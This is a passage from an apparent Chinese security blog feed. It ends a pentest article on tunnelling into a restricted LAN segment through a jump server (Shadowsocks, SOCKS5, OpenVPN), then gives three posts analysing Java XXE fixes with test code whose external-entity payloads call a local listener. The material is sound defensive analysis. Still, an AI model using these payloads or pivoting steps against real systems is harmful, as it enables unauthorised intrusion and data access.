bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">shadowsocks-libqss.exe -c config.json -S</span><br></pre></td></tr></table></figure><p>将以上两个文件放到与<code>shadowsocks-libqss.exe</code>文件同目录，双击运行该bat脚本，即可在服务器上一键启动Shadowsocks了！</p><h3 id="3-2-笔记本配置"><a href="#3-2-笔记本配置" class="headerlink" title="3.2 笔记本配置"></a>3.2 笔记本配置</h3><p>在我们的笔记本Shadowsocks客户端进行如下设置，即可连接到Shadowsocks服务器。</p><p><img src="/articles/2019/break-through-lan-segment-limit/shadowsock-client-config.png" alt="ss客户端配置"></p><p>在渗透时只需要将浏览器,burp等工具代理到<code>127.0.0.1:1080</code>，即可访问到我们的目标站点了。</p><p>注意：只有实现了http(s)/socks5功能或者使用系统代理的工具才能使用Shadowsocks！</p><h3 id="3-3-方案缺点"><a href="#3-3-方案缺点" class="headerlink" title="3.3 方案缺点"></a>3.3 方案缺点</h3><p>如果某个渗透测试工具本身没有http(s)/socks5代理功能，那该怎么办？也许有的朋友可能会想到使用<code>Proxifier/Sockcap</code>这类软件，来为这些软件进程“添加”代理功能。但是由于ss需要在本地有客户端，故在本地再使用Proxifier/Sockcap会出现流量传输死循环的情况。下个方案我们来解决这个问题。</p><h2 id="0x04-方案三：SOCKS5代理-Proxifier-Sockcap"><a href="#0x04-方案三：SOCKS5代理-Proxifier-Sockcap" class="headerlink" title="0x04 方案三：SOCKS5代理+Proxifier/Sockcap"></a>0x04 方案三：SOCKS5代理+Proxifier/Sockcap</h2><h3 id="4-1-跳板服务器配置"><a href="#4-1-跳板服务器配置" class="headerlink" title="4.1 跳板服务器配置"></a>4.1 跳板服务器配置</h3><p>这里我们使用绿色单exe版SOCKS5代理服务器软件goproxy，项目地址如下：</p><p><a href="https://github.com/snail007/goproxy" target="_blank" rel="noopener">https://github.com/snail007/goproxy</a></p><p>在跳板服务器上，使用以下命令即可快速启动SOCKS5代理服务。</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy.exe socks -t tcp -p "<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">38080</span>"</span><br></pre></td></tr></table></figure><h3 id="4-2-笔记本配置"><a href="#4-2-笔记本配置" class="headerlink" title="4.2 笔记本配置"></a>4.2 笔记本配置</h3><p>在本机使用Proxifier将需要代理的工具设置好代理，当然如果该工具有代理功能就不用了。</p><p><img src="/articles/2019/break-through-lan-segment-limit/add-socks5-server.png" alt="添加代理服务器"></p><p><img src="/articles/2019/break-through-lan-segment-limit/add-proxy-rules.png" alt="添加代理规则"></p><h3 id="4-3-方案缺点"><a href="#4-3-方案缺点" class="headerlink" title="4.3 方案缺点"></a>4.3 方案缺点</h3><ol><li>渗透中需要使用的工具，我们得一一为它们设置好代理，比较繁琐。</li><li>有些工具，你为它设置代理后，依然不能用，比如nmap。</li></ol><p>下个方案我们来解决这些问题。</p><h2 id="0x05-方案四：VPN"><a href="#0x05-方案四：VPN" class="headerlink" title="0x05 方案四：VPN"></a>0x05 方案四：VPN</h2><p>以上方案，优点很明显，缺点也很明显。为了实现对目标站点的全端口渗透无疑最好的方案是将跳板服务器搭建成VPN服务器了，然后笔记本直接通过VPN来访问目标站点，其他无需设置。即可使得所有工具都能访问到目标站点服务器的所有端口。</p><h3 id="5-1下载安装"><a href="#5-1下载安装" class="headerlink" title="5.1下载安装"></a>5.1下载安装</h3><p>去官网下载OpenVPN(我下载是openvpn-install-2.3.10-I601-x86_64.exe)，并在客户端和服务器按照以下同样的方式安装OpenVPN。安装过程没啥好说的，主要注意到以下这一步时，要选择红方框中的两个选项，不然安装完无法使用命令行制作证书。</p><p><img src="/articles/2019/break-through-lan-segment-limit/install-setting.png" alt="OpenVPN安装时需要选择的两项"></p><p>安装完成后系统会多出一张网卡TAP-Windows Adapter V9。</p><h3 id="5-2-系统设置"><a href="#5-2-系统设置" class="headerlink" title="5.2 系统设置"></a>5.2 系统设置</h3><p>设置跳板服务器用于访问目标站点的网卡共享给OpenVPN的虚拟网卡<code>TAP-Windows Adapter V9</code>，这步很重要！</p><p><img src="/articles/2019/break-through-lan-segment-limit/shared-network-card.png" alt="设置网卡共享"></p><p>网上说需要修改注册表，测试发现不改也行，这里做个记录，说不定有的环境需要。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters</span><br><span class="line">将IPEnableRouter改为1</span><br></pre></td></tr></table></figure><h3 id="5-3-生成VPN证书"><a href="#5-3-生成VPN证书" class="headerlink" title="5.3 生成VPN证书"></a>5.3 生成VPN证书</h3><p><strong>&lt;1&gt; 初始化配置</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init-config</span><br></pre></td></tr></table></figure><p><strong>&lt;2&gt; 复制配置文件为批处理</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars</span><br></pre></td></tr></table></figure><p><strong>&lt;3&gt; 清除key文件夹内的文件,文件夹不存在会自动创建</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clean-all</span><br></pre></td></tr></table></figure><p><strong>&lt;4&gt; 生成证书及key，需要填写一些参数，建议不要默认</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-ca</span><br></pre></td></tr></table></figure><p><strong>&lt;5&gt; 创建服务端证书及key，需要填写一些参数，建议不要默认，一路选y</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-key-server server</span><br></pre></td></tr></table></figure><p><strong>&lt;6&gt; 创建一个客户端证书及key，需要填写一些参数，建议不要默认,一路选y</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-key client</span><br></pre></td></tr></table></figure><p><strong>&lt;7&gt; 生成1024bit的key（pem文件），并结束此次创建</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-dh</span><br></pre></td></tr></table></figure><p>将新生成的<code>keys</code>目录下所有文件，全部拷贝到服务器OpenVPN的config目录下，<br>将keys目录下的<code>client1.crt</code>,<code>client1.key</code>和<code>ca.crt</code>复制到客户端的OpenVPN的config目录下。</p><h3 id="5-4-编写服务端和客户端连接配置文件"><a href="#5-4-编写服务端和客户端连接配置文件" class="headerlink" title="5.4 编写服务端和客户端连接配置文件"></a>5.4 编写服务端和客户端连接配置文件</h3><p>在服务器上，在OpenVPN的sample-config目录下复制一个<code>server.ovpn</code>配置模板文件，到config目录。以下列举的为需要修改的配置项，其他可以使用默认配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPN服务器的地址</span></span><br><span class="line">local <span class="number">192.168</span><span class="number">.149</span><span class="number">.140</span></span><br><span class="line"><span class="comment"># 使用tcp协议</span></span><br><span class="line">proto tcp</span><br><span class="line"><span class="comment"># 将目标站点所在的网段，写成路由推送给VPN客户端</span></span><br><span class="line">push <span class="string">"route 10.0.3.0 255.255.255.0"</span></span><br><span class="line"><span class="comment"># 给VPN客户端推送的DNS（在内网一般不用写）</span></span><br><span class="line">push <span class="string">"dhcp-option DNS 114.114.114.114"</span></span><br><span class="line"><span class="comment"># build-dh命令生成的是1024位的pem文件</span></span><br><span class="line">dh dh1024.pem</span><br></pre></td></tr></table></figure><p>在客户端，在OpenVPN的<code>sample-config</code>目录下复制一个<code>client.ovpn</code>配置模板文件，到<code>config</code>目录。以下列举的为需要修改的配置项，其他可以使用默认配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程VPN服务器地址</span></span><br><span class="line">remote <span class="number">192.168</span><span class="number">.149</span><span class="number">.140</span> <span class="number">1194</span></span><br><span class="line"><span class="comment"># 使用TCP协议，与服务端相同</span></span><br><span class="line">proto tcp</span><br></pre></td></tr></table></figure><p>最后先启动服务器端，右键托盘图标&gt;connect，小图标变绿色代表启动成功，若不成功可以查看下log日志，排查下原因。然后再启动客户端，操作一致。</p><h3 id="5-5-方案缺点"><a href="#5-5-方案缺点" class="headerlink" title="5.5 方案缺点"></a>5.5 方案缺点</h3><p>配置相对比较繁琐。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>这些方案我特意选择了比较简单易用的软件，并作了一个记录。方便自己某时需要，能快速突破限制，节省渗透时间。同时解决方案中推荐的软件在Linux上也有，搭建的方式类似。每个方案有优点也有缺点，大家要看自己在现场的实际需求来选择！</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.librehat.com/three-minutes-to-set-up-shadowsocks-server-on-windows/" target="_blank" rel="noopener">Windows下三分钟搭建Shadowoscks服务器端</a></li><li><a href="https://www.i5seo.com/shadowsocks-sock5-pac-vpn-difference-between.html" target="_blank" rel="noopener">Shadowsocks（Sock5代理）的PAC模式与全局模式与VPN的区别</a></li><li><a href="http://www.fyluo.com/m/?post=198" target="_blank" rel="noopener">OpenVPN Windows 平台安装部署教程</a></li><li><a href="https://www.landui.com/help/show-3871.html" target="_blank" rel="noopener">windows下利用OpenVPN搭建VPN服务器</a></li><li><a href="https://www.cnblogs.com/lidabo/p/7027463.html" target="_blank" rel="noopener">OpenVPN 安装、配置客户端和服务端，以及OpenVPN的使用 (Windows 平台)</a></li><li><a href="https://www.cnblogs.com/EasonJim/p/9657039.html" target="_blank" rel="noopener">OpenVPN搭建中tap与tun的实际使用区别</a></li><li><a href="http://blog.shell909090.org/blog/archives/2724/" target="_blank" rel="noopener">openvpn的几种基本模式</a></li><li><a href="https://www.ilanni.com/?p=9847" target="_blank" rel="noopener">烂泥：openvpn配置文件详解</a></li><li><a href="https://www.ilanni.com/?p=9877" target="_blank" rel="noopener">烂泥：openvpn tun模式下客户端与内网机器通信</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java XXE漏洞正确修复方法及原理</title>
      <link href="/articles/2019/java-xxe-bug-fix-right-and-principle/"/>
      <url>/articles/2019/java-xxe-bug-fix-right-and-principle/</url>
      
        <content type="html"><![CDATA[<p>前两周我们搞明白了XXE漏洞在Java语言中的深层原理，以及错误修复方案为何无法防御XXE的原理。今天我们来解决最后一个问题： <strong>Java中如何正确防御XXE，同时它为何能防御呢？</strong></p><p>OWASP推荐的修复代码如下，号称是可以防御几乎所有XXE攻击！今天我们来深入研究下它为何可以防御XXE漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXEFix</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">            InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">            Document doc = db.parse(is);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时使用以下命令,在本地启动一个监听1664端口的Web服务器，用于检测XXE漏洞是否被触发了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1664</span><br></pre></td></tr></table></figure><h2 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><p>在测试代码<code>dbf.setFeature(...);</code>处打断点，开始调式跟踪。</p><p><code>dbf.setFeature()</code>方法会调用多个对象的<code>setFeature()</code>方法，最终到达<code>XMLDocumentScannerImpl</code>对象<code>setFeature()</code>方法，调用链如下：</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/setFeature_invocation_list.png" alt="setFeature方法调用链"></p><p>在XMLDocumentScannerImpl.setFeature()中，将<code>fDisallowDoctype</code>属性设置为了<code>true</code>。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/XMLDocumentScannerImpl_fDisallowDoctype_false.png" alt="fDisallowDoctype属性被设置为true"></p><p>在这些XML解析器完成设置后，解析器会调用<code>XMLDocumentScannerImpl.scanDocument()</code>对XML的文档进行扫描。在解析器读到<code>DOCTYPE</code>字符串时，扫描状态会被设置为<code>SCANNER_STATE_DOCTYPE</code>。解析器会进入<code>SCANNER_STATE_DOCTYPE</code>阶段。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/setScannerState_SCANNER_STATE_DOCTYPE.png" alt="扫描状态会被设置为SCANNER_STATE_DOCTYPE"></p><p>该阶段会首先判断<code>fDisallowDoctype</code>的值，由上面的跟踪可知<code>fDisallowDoctype</code>已经被改为<code>true</code>，所以会调用<code>reportFatalError()</code>方法，输出致命错误报告并向上抛出解析异常。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/reportFatalError.png" alt="输出致命错误报告并向上抛出解析异常"></p><p>异常会被抛到<code>XML11Configuration.parse()</code>中处理。处理的结果是<code>fParseInProgress</code>变量被设置为了<code>false</code>，接着会调用<code>cleanup()</code>方法在完全解析XML文档之前终止解析，释放解析期间分配的任何资源。所以程序不会运行到漏洞触发处。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/fParseInProgress_false.png" alt="终止解析XML"></p><p>最终运行结果如下，Web服务器也并未收到Http请求。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/result.png" alt="最终运行结果"></p><h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/sGcaDCokVxhELd63-0TmIw" target="_blank" rel="noopener">Java XXE注入修复问题填坑实录</a></li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个被广泛流传的XXE漏洞错误修复方案</title>
      <link href="/articles/2019/a-widely-circulated-xxe-bug-fix/"/>
      <url>/articles/2019/a-widely-circulated-xxe-bug-fix/</url>
      
        <content type="html"><![CDATA[<p>现在百度”XXE漏洞修复”，搜索到的Java语言修复方案大部分如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>经过实际的测试发现<code>setExpandEntityReferences(false)</code>根本无法防御XXE漏洞！不禁思考到两个问题：</p><ol><li>setExpandEntityReferences为何无法防御XXE？</li><li>为何一个无法防御的方案，却广为流传？</li></ol><p>上一周我们深入Java内置XML解析器中，研究XXE漏洞的深层原理。这周我们在这个基础上，进一步弄清以上两个问题。</p><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXETest02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">        dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">        String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                        <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664/test.dtd\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">        InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">        Document doc = db.parse(is);</span><br><span class="line">        System.out.println(doc.getElementsByTagName(<span class="string">"doc"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test by c0ny1</span><br></pre></td></tr></table></figure><h2 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><p>我们在<code>dbf.setExpandEntityReferences(false);</code>打断点开始分析！</p><p>setExpandEntityReferences(false)会将DocumentBuilderFactory对象中的expandEntityRef属性默认值true修改为false。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/1.png" alt></p><p>在newDocumentBuilder()会方法返回一个DocumentBuilderImpl对象前，会在DocumentBuilderImpl对象初始化时，调用setFeature()方法对DOM解析器的<code>CREATE_ENTITY_REF_NODES_FEATURE</code>(<a href="http://apache.org/xml/features/dom/create-entity-ref-nodes" target="_blank" rel="noopener">http://apache.org/xml/features/dom/create-entity-ref-nodes</a>) 配置项设置为上一步的expandEntityRef变量的相反值true。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/2.png" alt></p><p>domParser.setFeature()最终会调用解析器配置对象设置目标配置项的值。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/3.png" alt></p><p>在XMLParser对象调用reset()方法重置状态时，AbstractDOMParser对象中通过解析器的配置对象获取到<code>CREATE_ENTITY_REF_NODES</code>（<a href="http://apache.org/xml/features/dom/create-entity-ref-nodes）" target="_blank" rel="noopener">http://apache.org/xml/features/dom/create-entity-ref-nodes）</a> 配置项的值true，并将<code>fCreateEntityRefNodes</code>属性设置为true。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/4.png" alt></p><p>在XMLDocumentFragmentScannerImpl.scanDocument()进入<code>START_ELEMENT</code>阶段后，next()方法会对XML中的元素进行扫描。当扫描到文本中的<code>&amp;</code>字符时（识别一般实体），解析器会调用scanEntityReference() 扫描实体引用。最后会调用setupCurrentEntity()创建连接并发起请求，以获取外部实体的内容，这时XXE漏洞将会触发！可以发现程序运行流程，依然会执行到XXE漏洞触发的位置。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/5.png" alt></p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/6.png" alt></p><p>继续跟踪，<code>AbstractDOMParser.endGeneralEntity()</code>在判断<code>fCreateEntityRefNodes</code>为<code>false</code>时，实体引用&amp;xxe将会被从DOM树删除，引用的具体内容<code>Test by c0ny1</code>将会在DOM树中展开,替换掉&amp;xxe。此时为<code>true</code>，实体引用节点将保留在DOM树中。这是setExpandEntityReferences方法对XML解析器处理XML最终产生影响的位置。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/7.png" alt></p><p>最终调用链如下：</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/8.png" alt></p><p>经过以上分析，我们大致了解了setExpandEntityReferences()方法的功能是对解析XML生成的Document文档进行设置，设置为 true则展开实体引用到生成的文档中替换掉<code>&amp;xxx</code>的实体引用声明，设置为false则保留实体引用声明的DOM树在生成的文档中。</p><p>由于setExpandEntityReferences(false)对Java内置XML解析器的设置起作用前，解析器就已经发起了对外部实体的请求了，故无法防御XXE漏洞！</p><h2 id="0x03-思考原因"><a href="#0x03-思考原因" class="headerlink" title="0x03 思考原因"></a>0x03 思考原因</h2><p>为何setExpandEntityReferences明明无法防御XXE漏洞，但却很多人在使用呢？当我看了官方JDK API文档之后，发现描述过于简单，从字面上理解很容易与方法的实际功能存在偏差。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/9.png" alt></p><p>初步判断有两个原因：</p><ol><li><p>官方文档的描述太过于模糊，很容易让人产生歧义。如果没有跟踪该方法底层实现很容易对它的实际功能理解错误，从而导致错误使用。</p></li><li><p>第一批修复的人应该是看了官方JDK文档来编写修复代码的，之后更多的人是直接百度到了一批人的编写的错误修复代码，直接复制粘贴。导致这个错误的修复方案进一步蔓延。</p></li></ol><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/sGcaDCokVxhELd63-0TmIw" target="_blank" rel="noopener">Java XXE注入修复问题填坑实录</a></li><li><a href="https://mp.weixin.qq.com/s/bTeJYzUN9T1u-KDZON5FiQ" target="_blank" rel="noopener">修不好的洞，JDK的坑——从WxJava XXE注入漏洞中发现了一个对JDK的误会</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>探究Java中XXE漏洞的深层原理</title>
      <link href="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/"/>
      <url>/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/</url>
      
        <content type="html"><![CDATA[<p>前段时间微信支付JDK又出现了XXE漏洞，原因是对前一个XXE漏洞没有修复成功。细思深层原因，是因为对Java JDK提供的API函数理解不正确，导致误用函数进行防御。我不禁思考了以下问题:</p><p>1.Java中XXE漏洞的深层原理是什么？</p><p>2.以下代码为何无法防御XXE？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory.setExpandEntityReferences(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><p>3.以下代码为何能够防御XXE？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>要弄清以上问题，我们必须深入到Java内置解析器中去一探究竟。于是我打算从JDK代码层面去跟踪解析器执行的每一步操作。接下来我会用三周的文章弄清这三个问题，本周先来弄清第一个。</p><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><p>Java常用解析XML的方式有DOM，SAX，JDOM和DOM4j。我编写了4种方式的XXE漏洞测试代码，运行发现，漏洞触发点都是一样的。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/testcode.png" alt="测试代码"></p><p>说明这4种解析方式底层实现调用的API函数都是一样的。这里我选择DOM这种最常规的方式来举例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXETest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">            InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">            Document doc = db.parse(is);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在公众号回复”Java XXE漏洞测试代码”，获取所有测试代码下载地址。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>随着Java不断的成熟，它内置的解析器也越来越复杂，这里我们只挑和XXE漏洞相关的核心操作来说明。</p><p>由于所有解析方式都调用了XMLParser类来对XML文档进行解析。故我们从该对象的解析函数Parser开始跟踪。</p><p>XMLParser类会调用XML11Configuration类来解析XML文档的配置。而XML11Cofiguration类又会调用XMLDocumentFragmentScannerImpl类的scanDocument()对XML文档片段的结构和内容进行扫描。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/scanDocument.png" alt></p><p>scanDocument方法会先扫描XML的Document部分（START_DOCUMENT阶段），然后在扫描Document中的DTD（DTD阶段），当文档扫描器完成DTD的扫描后，进入<code>START_ELEMENT</code>阶段.</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/scanDocument1.png" 